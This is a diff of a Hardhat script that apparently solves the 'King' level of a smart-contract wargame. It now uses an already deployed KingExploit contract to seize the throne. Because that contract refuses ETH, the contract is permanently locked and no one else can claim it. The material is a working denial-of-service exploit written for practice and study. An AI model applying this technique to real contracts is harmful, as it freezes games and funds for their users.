@@ -1,19 +1,29 @@
 import { ethers } from "hardhat";
 
 /**
- * Claims the throne by deploying a KingExploit contract that becomes the king
+ * Claims the throne using a previously deployed KingExploit contract that becomes the king
  * but can't receive ETH, making it impossible for anyone else to become king.
  * 
  * Usage: 
  * npx hardhat run scripts/level-09-king/claim-throne.ts --network localhost
- * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-09-king/claim-throne.ts --network sepolia
+ * KING_ADDRESS=0xKingAddress EXPLOIT_ADDRESS=0xExploitAddress npx hardhat run scripts/level-09-king/claim-throne.ts --network sepolia
  */
 async function main() {
-  // Get contract address from environment variable or use default
-  const defaultAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390"; // Replace with your actual default address
-  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
+  // Get contract addresses from environment variable or use defaults
+  const defaultKingAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390"; // Replace with your actual default King address
+  const kingAddress = process.env.KING_ADDRESS || defaultKingAddress;
   
-  console.log(`Using King contract address: ${contractAddress}`);
+  // For the exploit address, we require it to be provided
+  if (!process.env.EXPLOIT_ADDRESS) {
+    console.error("Error: No KingExploit contract address provided.");
+    console.error("Please provide the address of your deployed KingExploit contract using the EXPLOIT_ADDRESS environment variable.");
+    console.error("Example: EXPLOIT_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-09-king/claim-throne.ts --network sepolia");
+    return;
+  }
+  const exploitAddress = process.env.EXPLOIT_ADDRESS;
+  
+  console.log(`Using King contract address: ${kingAddress}`);
+  console.log(`Using KingExploit contract address: ${exploitAddress}`);
   
   // Define a minimal ABI for the King contract
   const kingABI = [
@@ -23,7 +33,13 @@ async function main() {
   ];
   
   // Create a contract instance using the minimal ABI
-  const kingContract = new ethers.Contract(contractAddress, kingABI, ethers.provider);
+  const kingContract = new ethers.Contract(kingAddress, kingABI, ethers.provider);
+  
+  // Get the KingExploit contract factory and attach to the deployed instance
+  const KingExploit = await ethers.getContractFactory("KingExploit");
+  const kingExploit = KingExploit.attach(exploitAddress);
+  
+  console.log(`Connected to KingExploit contract at: ${exploitAddress}`);
   
   const [deployer] = await ethers.getSigners();
   console.log(`Attacker address: ${deployer.address}`);
@@ -39,21 +55,11 @@ async function main() {
     console.log(`Current prize: ${ethers.formatEther(currentPrize)} ETH`);
     console.log(`Owner: ${owner}`);
     
-    if (currentKing === deployer.address) {
-      console.log("You are already the king! No need to proceed further.");
+    // Check if our exploit contract is already the king
+    if (currentKing.toLowerCase() === exploitAddress.toLowerCase()) {
+      console.log("KingExploit contract is already the king! No need to proceed further.");
       return;
     }
-    
-    // Deploy the KingExploit contract
-    console.log("Deploying KingExploit contract...");
-    const KingExploit = await ethers.getContractFactory("KingExploit");
-    
-    // Deploy KingExploit contract with the King contract address
-    const kingExploit = await KingExploit.deploy(contractAddress);
-    await kingExploit.waitForDeployment();
-    
-    const exploitAddress = await kingExploit.getAddress();
-    console.log(`KingExploit deployed at: ${exploitAddress}`);
     
     // Calculate the amount needed to claim the throne (current prize + a small buffer)
     const prizeToSend = currentPrize + ethers.parseEther("0.01");
@@ -70,7 +76,7 @@ async function main() {
     console.log("Checking if exploit worked...");
     const newKing = await kingContract._king();
     
-    if (newKing === exploitAddress) {
+    if (newKing.toLowerCase() === exploitAddress.toLowerCase()) {
       console.log("\nExploit successful! KingExploit contract is now the king.");
       console.log("Since the KingExploit contract can't receive ETH, no one can become king anymore.");
     } else {
